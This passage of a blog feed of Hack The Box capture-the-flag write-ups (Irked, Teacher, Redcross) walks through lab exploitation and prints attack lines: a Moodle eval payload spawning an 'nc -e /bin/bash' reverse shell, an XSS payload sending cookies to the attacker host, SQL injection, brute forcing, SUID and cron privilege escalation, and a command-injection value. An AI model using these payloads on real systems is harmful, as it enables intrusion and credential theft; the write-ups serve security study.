keyfile results in a hash that starts with a null byte so that seems to create a problem with keepass2john:# sha256sum admin.png 0063c12d1bf2ac03fb677e1915d1e96e3ab2cb7e381a186e58e8a06c5a296f39  admin.pngThe fix was to just upgrade John to the latest version and I was able to get the hash after:# keepass2john -k admin.png root.kdbx root:$keepass$*2*1*0*ea5626a6904620cad648168ef3f1968766f0b5f527c9a8028c1c1b03f2490449*cb3114b5089ffddbb3d607e490176e5e8da3022fc899fad5f317f1e4ebf4c268*a0b68d67dca93aee8f9804c28dac5995*afd02b46e630ff764adb50b7a2aae99d8961b1ab4676aff41c21dca19550c9ac*43c6588d17bceedbd00ed20d5ea310b82170252e29331671cc8aea3edd094ef6*1*64*0063c12d1bf2ac03fb677e1915d1e96e3ab2cb7e381a186e58e8a06c5a296f39Then it didn’t take long to crack the password: darkness# john -w=/usr/share/wordlists/rockyou.txt hash.txtUsing default input encoding: UTF-8Loaded 1 password hash (KeePass [SHA256 AES 32/64 OpenSSL])Cost 1 (iteration count) is 1 for all loaded hashesCost 2 (version) is 2 for all loaded hashesCost 3 (algorithm [0=AES, 1=TwoFish, 2=ChaCha]) is 0 for all loaded hashesWill run 4 OpenMP threadsPress 'q' or Ctrl-C to abort, almost any other key for statusdarkness         (root)1g 0:00:00:00 DONE (2019-05-02 21:35) 100.0g/s 73600p/s 73600c/s 73600C/s dreamer..raquelUse the \"--show\" option to display all of the cracked passwords reliablySession completedI used kpcli to open the KeePass database and found the root.txt hash inside.# kpcli --key admin.png --kdb root.kdbxPlease provide the master password: *************************KeePass CLI (kpcli) v3.1 is ready for operation.Type 'help' for a description of available commands.Type 'help &lt;command&gt;' for details on individual commands.kpcli:/&gt; ls=== Groups ===chest/kpcli:/&gt; ls chest=== Groups ===hash/kpcli:/&gt; ls chest/hash=== Entries ===1. root.txtkpcli:/&gt; show -f 0Title: root.txtUname: Gilfoyle Pass: 436b83...  URL: Notes: HTB FTW!"
  },
  
  {
    "title": "Irked - Hack The Box",
    "url": "/posts/htb-writeup-irked/",
    "categories": "hackthebox, infosec",
    "tags": "ctf, stego, cve, metasploit, suid",
    "date": "2019-04-27 00:00:00 +0800",
    





    
    "snippet": "Irked is an easy box running a backdoored UnrealIRC installation. I used a Metasploit module to get a shell then ran steghide to obtain the SSH credentials for the low privileged user then got root...",
    "content": "Irked is an easy box running a backdoored UnrealIRC installation. I used a Metasploit module to get a shell then ran steghide to obtain the SSH credentials for the low privileged user then got root by exploiting a vulnerable SUID binary.Tools/Exploits/CVEs used  steghide  metasploitSummary  UnrealIRCd MSF exploit for initial foothold  steghide encoded file containing password for user  SUID binary for priv escNmapAside from the typical Apache and OpenSSH services, I noticed that UnrealIRCd is installed.# nmap -p- -sC -sV 10.10.10.117Starting Nmap 7.70 ( https://nmap.org ) at 2018-11-17 14:02 ESTNmap scan report for 10.10.10.117Host is up (0.019s latency).Not shown: 65528 closed portsPORT      STATE SERVICE VERSION22/tcp    open  ssh     OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)| ssh-hostkey: |   1024 6a:5d:f5:bd:cf:83:78:b6:75:31:9b:dc:79:c5:fd:ad (DSA)|   2048 75:2e:66:bf:b9:3c:cc:f7:7e:84:8a:8b:f0:81:02:33 (RSA)|   256 c8:a3:a2:5e:34:9a:c4:9b:90:53:f7:50:bf:ea:25:3b (ECDSA)|_  256 8d:1b:43:c7:d0:1a:4c:05:cf:82:ed:c1:01:63:a2:0c (ED25519)80/tcp    open  http    Apache httpd 2.4.10 ((Debian))|_http-server-header: Apache/2.4.10 (Debian)|_http-title: Site doesn't have a title (text/html).111/tcp   open  rpcbind 2-4 (RPC #100000)| rpcinfo: |   program version   port/proto  service|   100000  2,3,4        111/tcp  rpcbind|   100000  2,3,4        111/udp  rpcbind|   100024  1          33436/udp  status|_  100024  1          50397/tcp  status6697/tcp  open  irc     UnrealIRCd8067/tcp  open  irc     UnrealIRCd50397/tcp open  status  1 (RPC #100024)65534/tcp open  irc     UnrealIRCdService Info: Host: irked.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernelWebpageThe main page just has a picture and a note about IRC.UnrealIRCd exploitationThe box is running UnrealIRCd and searchsploit shows there’s an MSF exploit for it:root@ragingunicorn:~/Downloads# searchsploit unrealircUnrealIRCd 3.2.8.1 - Backdoor Command Execution (Metasploit)Getting a shell with Metasploit is easy:msf5 exploit(unix/irc/unreal_ircd_3281_backdoor) &gt; show optionsModule options (exploit/unix/irc/unreal_ircd_3281_backdoor):   Name    Current Setting  Required  Description   ----    ---------------  --------  -----------   RHOSTS  10.10.10.117     yes       The target address range or CIDR identifier   RPORT   8067             yes       The target port (TCP)Payload options (cmd/unix/reverse):   Name   Current Setting  Required  Description   ----   ---------------  --------  -----------   LHOST  10.10.14.23      yes       The listen address (an interface may be specified)   LPORT  4444             yes       The listen portExploit target:   Id  Name   --  ----   0   Automatic Targetmsf exploit(unix/irc/unreal_ircd_3281_backdoor) &gt; run[*] Started reverse TCP double handler on 10.10.14.23:4444 [*] 10.10.10.117:8067 - Connected to 10.10.10.117:8067...    :irked.htb NOTICE AUTH :*** Looking up your hostname...[*] 10.10.10.117:8067 - Sending backdoor command...[*] Accepted the first client connection...[*] Accepted the second client connection...[*] Command: echo O1zcz5ML2uK8OjPk;[*] Writing to socket A[*] Writing to socket B[*] Reading from sockets...[*] Reading from socket A[*] A: \"O1zcz5ML2uK8OjPk\\r\\n\"[*] Matching...[*] B is input...[*] Command shell session 1 opened (10.10.14.23:4444 -&gt; 10.10.10.117:58328) at 2018-11-17 14:08:40 -0500I have a shell as user ircd:python -c 'import pty;pty.spawn(\"/bin/bash\")'ircd@irked:~/Unreal3.2$ ididuid=1001(ircd) gid=1001(ircd) groups=1001(ircd)The djmardov user home directroy has a .backup file that contains the password for some stego encoded file:djmardov@irked:~/Documents$ ls -lals -latotal 16drwxr-xr-x  2 djmardov djmardov 4096 May 15  2018 .drwxr-xr-x 18 djmardov djmardov 4096 Nov  3 04:40 ..-rw-r--r--  1 djmardov djmardov   52 May 16  2018 .backup-rw-------  1 djmardov djmardov   33 May 15  2018 user.txtdjmardov@irked:~/Documents$ cat .backupcat .backupSuper elite steg backup pwUPupDOWNdownLRlrBAbaSSssPassword: UPupDOWNdownLRlrBAbaSSssSince the note mentionned stego and this box is rated as easy, I guessed that it would be an off-the-shelf tool like steghide and not some custom obfuscation. The hidden file is found in the irked.jpg image from the main page and the steg doesn’t use any passphrase.root@ragingunicorn:~/Downloads# steghide extract -sf irked.jpg Enter passphrase: wrote extracted data to \"pass.txt\".root@ragingunicorn:~/Downloads# root@ragingunicorn:~/Downloads# cat pass.txtKab6h+m+bbp2J:HGdjmardov’s password is: Kab6h+m+bbp2J:HGI can SSH in and get the user flag:djmardov@irked:~/Documents$ cat user.txtcat user.txt4a66a7...Priv escI found a suspicious SUID file: /usr/bin/viewuserdjmardov@irked:~$ find / -perm /4000 2&gt;/dev/nullfind / -perm /4000 2&gt;/dev/null/usr/lib/dbus-1.0/dbus-daemon-launch-helper/usr/lib/eject/dmcrypt-get-device/usr/lib/policykit-1/polkit-agent-helper-1/usr/lib/openssh/ssh-keysign/usr/lib/spice-gtk/spice-client-glib-usb-acl-helper/usr/sbin/exim4/usr/sbin/pppd/usr/bin/chsh/usr/bin/procmail/usr/bin/gpasswd/usr/bin/newgrp/usr/bin/at/usr/bin/pkexec/usr/bin/X/usr/bin/passwd/usr/bin/chfn/usr/bin/viewuserWhen I execute the file, I see it runs /tmp/listusersdjmardov@irked:~$ /usr/bin/viewuserThis application is being devleoped to set and test user permissionsIt is still being actively developed(unknown) :0           2018-11-17 13:54 (:0)djmardov pts/1        2018-11-17 14:19 (10.10.14.23)sh: 1: /tmp/listusers: not foundSince it’s a running as root and I have write access to tmp I can just copy /bin/sh to /tmp/listusers and gain rootdjmardov@irked:~$ cp /bin/sh /tmp/listusersdjmardov@irked:~$ /usr/bin/viewuserThis application is being devleoped to set and test user permissionsIt is still being actively developed(unknown) :0           2018-11-17 13:54 (:0)djmardov pts/1        2018-11-17 14:19 (10.10.14.23)# cd /root# cat root.txt8d8e9e..."
  },
  
  {
    "title": "Teacher - Hack The Box",
    "url": "/posts/htb-writeup-teacher/",
    "categories": "hackthebox, infosec",
    "tags": "moodle, mysql, enumeration, ctf, tar, cronjob",
    "date": "2019-04-20 00:00:00 +0800",
    





    
    "snippet": "Teacher uses the Moodle Open Source Learning platform and contains a vulnerability in the math formula that gives us RCE. The credentials for the Moodle application are found in a .png file that co...",
    "content": "Teacher uses the Moodle Open Source Learning platform and contains a vulnerability in the math formula that gives us RCE. The credentials for the Moodle application are found in a .png file that contains text instead of an actual image. After getting a shell with the math formula, we find the low privilege user credentials in the MySQL database. We then escalate to root by abusing a backup script running from a cronjob as root.Tools/Exploits/CVEs used  https://blog.ripstech.com/2018/moodle-remote-code-execution/  https://github.com/StefanoDeVuono/steghideNmapOnly the HTTP port is open on this box, running the Apache webserver.# nmap -F -sC -sV 10.10.10.153Starting Nmap 7.70 ( https://nmap.org ) at 2018-12-01 21:20 ESTNmap scan report for teacher.htb (10.10.10.153)Host is up (0.018s latency).Not shown: 99 closed portsPORT   STATE SERVICE VERSION80/tcp open  http    Apache httpd 2.4.25 ((Debian))|_http-server-header: Apache/2.4.25 (Debian)|_http-title: Blackhat highschoolEnumerating the websiteThe first pass at dirbursting shows the /moodle directory, which refers to the Moodle Open Source Learning platform.# gobuster -w /usr/share/seclists/Discovery/Web-Content/big.txt -t 50 -u http://teacher.htb/.htaccess (Status: 403)/.htpasswd (Status: 403)/css (Status: 301)/fonts (Status: 301)/images (Status: 301)/javascript (Status: 301)/js (Status: 301)/manual (Status: 301)/moodle (Status: 301)/phpmyadmin (Status: 403)/server-status (Status: 403)=====================================================2018/12/01 14:02:42 Finished=====================================================I also spidered the host with Burp hoping to catch other stuff. I noticed that the image file 5.png wasn’t showing up with the same icon as the rest of the other files:When we browse to the gallery, we also see there’s an image missing:The source code contains the file as well as a weird javascript console message:The 5.png image file exists but isn’t a valid image:If we look at the file with Burp, we see that the file contains part of a password: Th4C00lTheacha. We can guess that the user is probably named Giovanni based on the note.Moodle enumerationThe Moodle application is running on this server, as shown below:Guest login is enabled but we don’t have access to anything useful with this account.We got a partial password from the 5.png file but we’re missing the last letter. I used the following script to generate a wordlist:f = open('pwd', 'w')for i in range (0,127):\tf.write('Th4C00lTheacha{}\\n'.format(chr(i)))Then using hydra we can bruteforce the giovanni account. We’ll match on Set-Cookie as a positive response since the cookie is only set when we submit the correct credentials.# hydra -I -l giovanni -P pwd.txt 10.10.10.153 http-post-form \"/moodle/login/index.php:username=^USER^&amp;password=^PASS^:S=Set-Cookie\"Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.Hydra (http://www.thc.org/thc-hydra) starting at 2018-12-01 21:37:44[DATA] max 16 tasks per 1 server, overall 16 tasks, 128 login tries (l:1/p:128), ~8 tries per task[DATA] attacking http-post-form://10.10.10.153:80//moodle/login/index.php:username=^USER^&amp;password=^PASS^:S=Set-Cookie[80][http-post-form] host: 10.10.10.153   login: giovanni   password: Th4C00lTheacha#1 of 1 target successfully completed, 1 valid password foundHydra (http://www.thc.org/thc-hydra) finished at 2018-12-01 21:38:06We found the password: Th4C00lTheacha#We can now log in to the Moodle webpage with giovanni / Th4C00lTheacha#:I googled vulnerabilities for Moodle and found a blog post about an RCE vulnerability in the Math formulas of the Quiz component. Basically, the math formula uses the PHP eval function to return the result and the input sanitization that is put in place in Moodle is not sufficient and can bypassed. Once we have RCE we can spawn a reverse shell.First we add a new quiz:Then create a question with ‘Calculated’ type:We can put anything in the question name and text but for the formula we enter /*{a*/`$_GET[0]`;//{x}}The formula will execute code we put in the $_GET['0'] parameter:10.10.10.153/moodle/question/question.php?returnurl=%2Fmod%2Fquiz%2Fedit.php%3Fcmid%3D7%26addonpage%3D0&amp;appendqnumstring=addquestion&amp;scrollpos=0&amp;id=6&amp;wizardnow=datasetitems&amp;cmid=7&amp;0=(nc -e /bin/bash 10.10.14.23 4444)This’ll spawn a shell for us:# nc -lvnp 4444listening on [any] 4444 ...connect to [10.10.14.23] from (UNKNOWN) [10.10.10.153] 49210iduid=33(www-data) gid=33(www-data) groups=33(www-data)python -c 'import pty;pty.spawn(\"/bin/bash\")'www-data@teacher:/var/www/html/moodle/question$Getting access to giovanni userLike any web application with a database backend, the first thing I do once I get a shell is look for hardcoded database credentials in the PHP configuration file of the application. The Moodle configuration file contains the root account password for the MySQL database:www-data@teacher:/var/www/html/moodle$ cat config.php&lt;?php  // Moodle configuration file[...]$CFG-&gt;dbtype    = 'mariadb';$CFG-&gt;dblibrary = 'native';$CFG-&gt;dbhost    = 'localhost';$CFG-&gt;dbname    = 'moodle';$CFG-&gt;dbuser    = 'root';$CFG-&gt;dbpass    = 'Welkom1!';List of databases:MariaDB [(none)]&gt; show databases;show databases;+--------------------+| Database           |+--------------------+| information_schema || moodle             || mysql              || performance_schema || phpmyadmin         |+--------------------+The mdl_user table contains passwords:MariaDB [moodle]&gt; show tables;show tables;+----------------------------------+| Tables_in_moodle                 |+----------------------------------+...| mdl_user                         |...MariaDB [moodle]&gt; select * from mdl_user;select * from mdl_user| id   | auth   | confirmed | policyagreed | deleted | suspended | mnethostid | username    | password                                                     | idnumber | firstname  | lastname | email          | emailstop | icq | skype | yahoo | aim | msn | phone1 | phone2 | institution | department | address | city | country | lang | calendartype | theme | timezone | firstaccess | lastaccess | lastlogin  | currentlogin | lastip        | secret | picture | url | description                                                               | descriptionformat | mailformat | maildigest | maildisplay | autosubscribe | trackforums | timecreated | timemodified | trustbitmask | imagealt | lastnamephonetic | firstnamephonetic | middlename | alternatename ||    1 | manual |         1 |            0 |       0 |         0 |          1 | guest       | $2y$10$ywuE5gDlAlaCu9R0w7pKW.UCB0jUH6ZVKcitP3gMtUNrAebiGMOdO |          | Guest user |          | root@localhost |         0 |     |       |       |     |     |        |        |             |            |         |      |         | en   | gregorian    |       | 99       |           0 |          0 |          0 |            0 |               |        |       0 |     | This user is a special user that allows read-only access to some courses. |                 1 |          1 |          0 |           2 |             1 |           0 |           0 |   1530058999 |            0 | NULL     | NULL             | NULL              | NULL       | NULL          ||    2 | manual |         1 |            0 |       0 |         0 |          1 | admin       | $2y$10$7VPsdU9/9y2J4Mynlt6vM.a4coqHRXsNTOq/1aA6wCWTsF2wtrDO2 |          | Admin      | User     | gio@gio.nl     |         0 |     |       |       |     |     |        |        |             |            |         |      |         | en   | gregorian    |       | 99       |  1530059097 | 1530059573 | 1530059097 |   1530059307 | 192.168.206.1 |        |       0 |     |                                                                           |                 1 |          1 |          0 |           1 |             1 |           0 |           0 |   1530059135 |            0 | NULL     |                  |                   |            |               ||    3 | manual |         1 |            0 |       0 |         0 |          1 | giovanni    | $2y$10$38V6kI7LNudORa7lBAT0q.vsQsv4PemY7rf/M1Zkj/i1VqLO0FSYO |          | Giovanni   | Chhatta  | Giio@gio.nl    |         0 |     |       |       |     |     |        |        |             |            |         |      |         | en   | gregorian    |       | 99       |  1530059681 | 1543718703 | 1543718276 |   1543718446 | 10.10.14.23   |        |       0 |     |                                                                           |                 1 |          1 |          0 |           2 |             1 |           0 |  1530059291 |   1530059291 |            0 |          |                  |                   |            |               || 1337 | manual |         0 |            0 |       0 |         0 |          0 | Giovannibak | 7a860966115182402ed06375cf0a22af                             |          |            |          |                |         0 |     |       |       |     |     |        |        |             |            |         |      |         | en   | gregorian    |       | 99       |           0 |          0 |          0 |            0 |               |        |       0 |     | NULL                                                                      |                 1 |          1 |          0 |           2 |             1 |           0 |           0 |            0 |            0 | NULL     | NULL             | NULL              | NULL       | NULL          |+------+--------+-----------+--------------+---------+-----------+------------+-------------+--------------------------------------------------------------+----------+------------+----------+----------------+-----------+-----+-------+-------+-----+-----+--------+--------+-------------+------------+---------+------+---------+------+--------------+-------+----------+-------------+------------+------------+--------------+---------------+--------+---------+-----+---------------------------------------------------------------------------+-------------------+------------+------------+-------------+---------------+-------------+-------------+--------------+--------------+----------+------------------+-------------------+------------+---------------+4 rows in set (0.00 sec)The Giovannibak account hash the 7a860966115182402ed06375cf0a22af MD5 hash, which is expelled if we look it up on https://hashkiller.co.uk/md5-decrypter.aspx.www-data@teacher:/$ su -l giovanniPassword: expelledgiovanni@teacher:~$ cat user.txtcat user.txtfa9ae...Priv escThe /home/giovanni/work directory contains a bunch of files, but the backup_courses.tar.gz timestamp keep changing every minute so we can assume the file is being created by a cron job running as root:giovanni@teacher:~/work$ ls -lRls -lR.:total 8drwxr-xr-x 3 giovanni giovanni 4096 Jun 27 04:58 coursesdrwxr-xr-x 3 giovanni giovanni 4096 Jun 27 04:34 tmp./courses:total 4drwxr-xr-x 2 root root 4096 Jun 27 04:15 algebra./courses/algebra:total 4-rw-r--r-- 1 giovanni giovanni 109 Jun 27 04:12 answersAlgebra./tmp:total 8-rwxrwxrwx 1 root root  256 Dec  2 03:52 backup_courses.tar.gzdrwxrwxrwx 3 root root 4096 Jun 27 04:58 courses./tmp/courses:total 4drwxrwxrwx 2 root root 4096 Jun 27 04:15 algebra./tmp/courses/algebra:total 4-rwxrwxrwx 1 giovanni giovanni 109 Jun 27 04:12 answersAlgebragiovanni@teacher:~/work$ dateSun Dec  2 03:52:38 CET 2018The backup script that runs as root is located in /usr/bin/backup.sh:#!/bin/bashcd /home/giovanni/work;tar -czvf tmp/backup_courses.tar.gz courses/*;cd tmp;tar -xf backup_courses.tar.gz;chmod 777 * -R;We can get the root flag by replacing the courses directory with a symlink to /root, waiting for the next archive to be created then untar it to retrieve the root flag:giovanni@teacher:~/work$ mv courses testgiovanni@teacher:~/work$ ln -s /root courses[ ... wait a minute ...]giovanni@teacher:~/work/tmp/courses$ cat root.txtcat root.txt4f3a8...The cronjob changes the permissions to 777 when it extracts the backup archive. If we swap the courses directory in the ~/work/tmp folder with a symlink to /etc it’ll change the permissions of /etc and everything in it to 777:giovanni@teacher:~/work/tmp$ rm -rf coursesgiovanni@teacher:~/work/tmp$ ln -s /etc coursesgiovanni@teacher:~/work/tmp$ ls -l / | grep etcls -l / | grep etcdrwxrwxrwx 85 root root  4096 Apr 18 21:55 etcNow that we have complete read-write access to anything in /etc we can change the password of the root user to anything we want:giovanni@teacher:/etc$ mkpasswd -m sha-512 yolo1234$6$jfdDr.oQ3xp6H/Em$iIPF1i31pZ/SeZe31/LDhruZFflDbmiFdsln.BA2w./lOtMUHMZYLOwsPAJaufSB4/Sn/gNIwZMWquEGR.sh1/After editing the /etc/shadow file we can log in as root:giovanni@teacher:/etc$ su -l rootPassword: root@teacher:~# iduid=0(root) gid=0(root) groups=0(root)"
  },
  
  {
    "title": "Redcross - Hack The Box",
    "url": "/posts/htb-writeup-redcross/",
    "categories": "hackthebox, infosec",
    "tags": "linux, xss, sqli, command injection, pgsql, cve, nss",
    "date": "2019-04-13 00:00:00 +0800",
    





    
    "snippet": "Redcross has a bit of everything: Cross-Site Scripting, a little bit of SQL injection, reviewing C source code to find a command injection vulnerability, light exploit modification and enumeration....",
    "content": "Redcross has a bit of everything: Cross-Site Scripting, a little bit of SQL injection, reviewing C source code to find a command injection vulnerability, light exploit modification and enumeration.Quick summary  XSS on contact form to get admin cookie  SQLi to get user creds (rabbit hole, credentials are not useful)  Find admin.redcross.htb sub-domain page  Log in to admin page using admin session cookie we stole with XSS  Create a shell account, log in to restricted shell, get source code of binary  Command injection in firewall control module, get reverse shell as www-data  Locate Haraka installation, use and modify exploit from exploit-db, gain shell as user penelope  Get DB connection string from /etc/nss-pgsql.conf, create new user with GID 0  Read /etc/nss-pgsql-root.conf, locate new DB connection string  Create new user user with UID and GID 0, su to new user and gain root accessTools/Exploits/CVEs used  Haraka &lt; 2.8.9 - Remote Command ExecutionPortscanOnly SSH and web ports are open:root@ragingunicorn:~# nmap -F 10.10.10.113Starting Nmap 7.70 ( https://nmap.org ) at 2018-11-10 14:19 ESTNmap scan report for 10.10.10.113Host is up (0.019s latency).Not shown: 97 filtered portsPORT    STATE SERVICE22/tcp  open  ssh80/tcp  open  http443/tcp open  httpsIntra webpagehttp://redcross.htb redirects to https://intra.redcross.htb/?page=login so we need to add that to our local hostfile.The main page contains a simple login form:At first glance, the login form doesn’t appear to be vulnerable to SQL injections but after trying a few user/password combinations, we are able to log in with the guest/guest credentials and we see the following message:So we know there’s at least two users: admin and guest.Because this is a messaging application, we can assume that admin will be checking messages periodically so we will try to get the admin session cookie with an XSS. Back on the main page, there is a contact form we can use to send messages to the administrator.The first two fields subject and body don’t appear to be vulnerable to XSS because the input is filtered. We get the following error message when we try to inject stuff like &lt;script&gt;....: Oops! Someone is trying to do something nasty...But the last field, cbody is not filtered and accepts any characters we send.To test the XSS, we’ll try a very simple payload that’ll create an image on the page pointing to our attacker machine. The request will contain the document.cookie which hopefully contains the session cookie.Payload: &lt;script&gt;var myimg = new Image(); myimg.src = 'http://10.10.14.23/q?=' + document.cookie;&lt;/script&gt;After a minute or so, we can see an incoming HTTP request made to our webserver, containg the admin session cookie:root@ragingunicorn:~# python -m SimpleHTTPServer 80Serving HTTP on 0.0.0.0 port 80 ...10.10.10.113 - - [11/Nov/2018 12:00:47] code 404, message File not found10.10.10.113 - - [11/Nov/2018 12:00:47] \"GET /q?=PHPSESSID=8e2u3570ceoa9vk2vofvgnibv3;%20LANG=EN_US;%20SINCE=1541955270;%20LIMIT=10;%20DOMAIN=admin HTTP/1.1\" 404 -Using Firefox’s web developer tools, we can simply change the cookies and add all four values into our session, then hit refresh on the main page to log in as admin.SQL injection on the web messaging appBased on the messages we see, we find the following users created in the database/system:  admin  penelope  charles  guestTwo parameters are vulnerable to SQL injections:  o parameter in GET /?o=2&amp;page=appExample:GET /?o=2'&amp;page=app HTTP/1.1DEBUG INFO: You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '1' or dest like '2'') LIMIT 10' at line 1  LIMIT cookie in GET /?o=2&amp;page=appExample:Cookie: domain=admin; lang=EN_US; PHPSESSID=8e2u3570ceoa9vk2vofvgnibv3; LIMIT=10'DEBUG INFO: You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''' at line 1Our best bet is to try to exploit the o parameter as exploiting the LIMIT cookie will be more difficult since we can’t do UNION SELECT after a LIMIT statement. We might be able to do something with PROCEDURE ANALYSE but since the box is rated medium/hard, I didn’t think this was going to be it.The first thing we notice with sqlmap is it kills the webserver pretty quickly, so I assumed there is some kind of WAF rate-limiting the connections to the server. If we wait a bit, we are able to access the server again.To use sqlmap, we will need to change the delay parameter to 1 second. It takes a long time but sqlmap eventually find the injection point:root@ragingunicorn:~# sqlmap -r login.req --risk=3 -p o --dbms=mysql --random-agent --delay=1 --technique=UE...[13:00:14] [INFO] parsing HTTP request from 'login.req'[13:00:14] [INFO] fetched random HTTP User-Agent header value 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; de) Opera 8.02' from file '/usr/share/sqlmap/txt/user-agents.txt'[13:00:14] [INFO] testing connection to the target URLsqlmap got a 301 redirect to 'https://intra.redcross.htb/?o=2&amp;page=app'. Do you want to follow? [Y/n] y[13:00:17] [INFO] heuristic (basic) test shows that GET parameter 'o' might be injectable (possible DBMS: 'MySQL')[13:00:18] [INFO] heuristic (XSS) test shows that GET parameter 'o' might be vulnerable to cross-site scripting (XSS) attacks[13:00:18] [INFO] testing for SQL injection on GET parameter 'o'for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) value? [Y/n] [13:00:19] [INFO] testing 'MySQL &gt;= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'[13:00:20] [WARNING] reflective value(s) found and filtering out[13:01:17] [INFO] testing 'MySQL &gt;= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'[13:02:14] [INFO] testing 'MySQL &gt;= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'[13:03:11] [INFO] testing 'MySQL &gt;= 5.5 OR error-based - WHERE or HAVING clause (EXP)'[13:04:08] [INFO] testing 'MySQL &gt;= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'[13:05:04] [INFO] testing 'MySQL &gt;= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'[13:06:01] [INFO] testing 'MySQL &gt;= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'[13:06:20] [INFO] GET parameter 'o' is 'MySQL &gt;= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)' injectable [13:06:20] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'[13:06:20] [INFO] testing 'MySQL UNION query (NULL) - 1 to 20 columns'[13:06:20] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found[13:06:42] [INFO] target URL appears to be UNION injectable with 4 columnsinjection not exploitable with NULL values. Do you want to try with a random integer value for option '--union-char'? [Y/n] [14:12:39] [INFO] testing 'MySQL UNION query (63) - 21 to 40 columns'[14:13:03] [INFO] testing 'MySQL UNION query (63) - 41 to 60 columns'[14:13:28] [INFO] testing 'MySQL UNION query (63) - 61 to 80 columns'[14:13:53] [INFO] testing 'MySQL UNION query (63) - 81 to 100 columns'[14:14:19] [WARNING] parameter length constraining mechanism detected (e.g. Suhosin patch). Potential problems in enumeration phase can be expectedGET parameter 'o' is vulnerable. Do you want to keep testing the others (if any)? [y/N] sqlmap identified the following injection point(s) with a total of 469 HTTP(s) requests:---Parameter: o (GET)    Type: error-based    Title: MySQL &gt;= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)    Payload: o=2') AND (SELECT 6000 FROM(SELECT COUNT(*),CONCAT(0x71717a7671,(SELECT (ELT(6000=6000,1))),0x716a767871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- scxH&amp;page=app---[14:33:52] [INFO] the back-end DBMS is MySQLweb server operating system: Linux Debian 9.0 (stretch)web application technology: Apache 2.4.25back-end DBMS: MySQL &gt;= 5.0[14:33:52] [INFO] fetched data logged to text files under '/root/.sqlmap/output/intra.redcross.htb'[*] shutting down at 14:33:52Listing databases: sqlmap -r login.req --risk=3 -p o --dbms=mysql --random-agent --delay=1.0 --technique=UE -T users --dbs[14:38:26] [INFO] used SQL query returns 2 entries[14:38:27] [INFO] retrieved: information_schema[14:38:28] [INFO] retrieved: redcrossavailable databases [2]:[*] information_schema[*] redcrossListing tables from redcross DB: sqlmap -r login.req --risk=3 -p o --dbms=mysql --random-agent --delay=1.0 --technique=UE -D redcross --tables[14:38:41] [INFO] retrieved: messages[14:38:42] [INFO] retrieved: requests[14:38:44] [INFO] retrieved: usersDatabase: redcross[3 tables]+----------+| messages || requests || users    |+----------+Dumping list of users: sqlmap -r login.req --risk=3 -p o --dbms=mysql --random-agent --delay=1.0 --technique=UE -D redcross -T users --dumpDatabase: redcrossTable: users[5 entries]+----+------+------------------------------+----------+--------------------------------------------------------------+| id | role | mail                         | username | password                                                     |+----+------+------------------------------+----------+--------------------------------------------------------------+| 1  | 0    | admin@redcross.htb           | admin    | $2y$10$z/d5GiwZuFqjY1jRiKIPzuPXKt0SthLOyU438ajqRBtrb7ZADpwq. || 2  | 1    | penelope@redcross.htb        | penelope | $2y$10$tY9Y955kyFB37GnW4xrC0.J.FzmkrQhxD..vKCQICvwOEgwfxqgAS || 3  | 1    | charles@redcross.htb         | charles  | $2y$10$bj5Qh0AbUM5wHeu/lTfjg.xPxjRQkqU6T8cs683Eus/Y89GHs.G7i || 4  | 100  | tricia.wanderloo@contoso.com | tricia   | $2y$10$Dnv/b2ZBca2O4cp0fsBbjeQ/0HnhvJ7WrC/ZN3K7QKqTa9SSKP6r. || 5  | 1000 | non@available                | guest    | $2y$10$U16O2Ylt/uFtzlVbDIzJ8us9ts8f9ITWoPAWcUfK585sZue03YBAi |+----+------+------------------------------+----------+--------------------------------------------------------------+The password are stored with the bcrypt password hashing function, which is very slow to brute force. After letting hashcat (hashcat -a 0 -m 3200) run for some time I was able to recover the following hashes:  guest / guest  penelope / alexx  charles / cookiemonsterNone of them work to log in with SSH but we are able to see a few additional messages when logging in with the web messaging application.  Please could you check the admin webpanel? idk what happens but when I’m checking the messages, alerts popping everywhere!! Maybe a virus?  Hey, my chief contacted me complaining about some problem in the admin webapp. I thought that you reinforced security on it… Alerts everywhere!!That may be a hint there is another hidden page/sub-domain…Admin web pageThere’s another host admin.redcross.htb that displays a totally different application:The same cookie we stole from the admin can be used here to log in:Under the user management menu, we can see and add users to the system:We can SSH with the new user we created:root@ragingunicorn:~# ssh snowscan@10.10.10.113snowscan@10.10.10.113's password: Linux redcross 4.9.0-6-amd64 #1 SMP Debian 4.9.88-1+deb9u1 (2018-05-07) x86_64The programs included with the Debian GNU/Linux system are free software;the exact distribution terms for each program are described in theindividual files in /usr/share/doc/*/copyright.Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extentpermitted by applicable law.$ lsbin  dev  etc  home  lib  lib64  root  usr$ iduid=2020 gid=1001(associates) groups=1001(associates)This is some kind of chroot jail, there’s not much we can do here. However we do find a single C source file: iptctl.c$ pwd/home/public/src$ cat iptctl.c /* * Small utility to manage iptables, easily executable from admin.redcross.htb * v0.1 - allow and restrict mode * v0.3 - added check method and interactive mode (still testing!) */...The file contains the program code that is called by the firewall management application on the admin page:Whenever we add/delete an IP from the firewall ACL’s, the PHP code does a system() call to run the iptctl application and make changes to the firewall rules. If we add a semi-colon in the id parameter we are able to inject commands and gain code execution.Example payload like the following: ip=1;id&amp;action=denyUsage: /opt/iptctl/iptctl allow|restrict|show 